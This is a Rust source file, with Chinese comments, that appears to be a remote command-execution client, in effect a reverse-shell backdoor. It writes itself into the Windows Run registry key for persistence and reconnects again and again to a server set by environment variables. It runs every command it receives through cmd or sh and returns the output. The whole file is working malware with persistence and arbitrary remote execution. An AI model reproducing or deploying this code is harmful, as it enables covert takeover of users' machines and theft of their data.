use std::{
    ffi::OsStr,
    io::{Read, Write},
    net::TcpStream,
    os::windows::ffi::OsStrExt,
    process::Command,
    thread,
    time::Duration,
    env,
};

use winreg::{
    enums::HKEY_CURRENT_USER,
    RegKey,
};

fn main() {
    // 设置开机自启动
    if let Err(e) = set_autostart() {
        eprintln!("Failed to set autostart: {}", e);
    }
    let server_addr = get_server_addr();
    // 主循环，尝试连接服务端
    loop {
        if let Ok(mut stream) = TcpStream::connect(server_addr) {
            println!("Connected to server");
            handle_connection(&mut stream);
        } else {
            println!("Failed to connect, retrying in 5 seconds...");
            thread::sleep(Duration::from_secs(5));
        }
    }
}


fn get_server_addr() -> String {
    // 尝试从环境变量读取，否则使用默认值
    let ip = env::var("SERVER_IP").unwrap_or_else(|_| {
        #[cfg(debug_assertions)]
        { "127.0.0.1".into() }

        #[cfg(not(debug_assertions))]
        { panic!("SERVER_IP must be set in production") }
    });

    let port = env::var("SERVER_PORT").unwrap_or("7878".into());

    format!("{}:{}", ip, port)
}


fn handle_connection(stream: &mut TcpStream) {
    let mut buffer = [0; 1024];

    loop {
        match stream.read(&mut buffer) {
            Ok(size) if size > 0 => {
                let command = String::from_utf8_lossy(&buffer[..size]);
                println!("Received command: {}", command);

                // 执行命令并获取输出
                let output = if cfg!(target_os = "windows") {
                    Command::new("cmd")
                        .args(&["/C", &command])
                        .output()
                        .expect("Failed to execute command")
                } else {
                    Command::new("sh")
                        .arg("-c")
                        .arg(&*command)  // 注意这里的解引用
                        .output()
                        .expect("Failed to execute command")
                };

                // 发送执行结果回服务端
                let result = if output.status.success() {
                    String::from_utf8_lossy(&output.stdout).to_string()
                } else {
                    String::from_utf8_lossy(&output.stderr).to_string()
                };

                if let Err(e) = stream.write_all(result.as_bytes()) {
                    println!("Error writing to stream: {}", e);
                    break;
                }
            }
            Ok(_) => break, // 连接关闭
            Err(e) => {
                println!("Error reading from stream: {}", e);
                break;
            }
        }
    }
}

fn set_autostart() -> std::io::Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = r"Software\Microsoft\Windows\CurrentVersion\Run";
    let (key, _) = hkcu.create_subkey(path)?;

    // 获取当前可执行文件路径
    let exe_path = std::env::current_exe()?;
    let exe_path_str = exe_path.to_string_lossy().into_owned();
    
    // 设置注册表项
    key.set_value("RustCommandClient", &exe_path_str)?;

    Ok(())
}
